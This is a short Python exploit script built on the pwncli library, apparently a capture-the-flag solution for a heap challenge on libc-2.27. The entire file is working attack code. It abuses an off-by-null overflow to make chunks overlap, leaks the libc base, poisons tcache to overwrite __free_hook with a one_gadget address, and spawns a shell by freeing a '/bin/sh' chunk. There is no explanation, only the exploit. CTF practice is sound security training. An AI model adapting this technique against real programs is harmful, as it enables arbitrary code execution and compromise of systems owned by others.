#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data="dead"):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)


def show(idx):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(idx))
    m = p.recvline(0)
    info(f"get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(idx))

# libc-2.27 off by null

add(0x420) # 0
add(0x80) # 1
add(0x4f0) # 2
add(0x10, "/bin/sh\x00") # 3

dele(0)
dele(1)
add(0x88, "a"*0x88) # 0

dele(0)
add(0x88, b"a"*0x80 + p64(0x4c0)) # 0

dele(2)
add(0x420) # 1

m = show(0)
libc_base = u64_ex(m) - 0x3ebca0
log_libc_base_addr(libc_base)
libc.address = libc_base

add(0x80) # 2

dele(0)
dele(2)

add(0x80, p64(libc.sym['__free_hook']))
add(0x80)
add(0x80, p64(libc_base + list(get_current_one_gadget())[1]))

dele(3)

get_flag_when_get_shell(p)

p.interactive()